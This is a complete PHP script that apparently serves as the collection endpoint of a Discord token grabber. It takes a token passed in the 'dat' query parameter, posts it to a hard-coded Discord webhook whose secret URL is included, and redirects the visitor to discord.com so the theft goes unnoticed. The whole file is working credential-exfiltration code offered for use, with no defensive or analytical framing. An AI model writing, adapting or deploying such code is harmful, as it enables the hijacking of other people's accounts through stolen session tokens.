<?php

$dat = $_GET['dat']; // Get the token data from the query parameter

// Define the webhook URL and the message to send
$webhook_url = 'https://discord.com/api/webhooks/1019999315445432401/Jz6PIw3ydi3h7DqEPoINRGJMpx2hPdzmHEAMbmRYs9A6_c5IWS_Hzuwd7Ro8QtjF4DyU';
$message = array('content' => 'Token: ' . $dat);

// Use cURL to send the message to the webhook
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Output the response from the webhook (for testing purposes)
// Redirect back to Discord
header('Location: https://discord.com');

?>
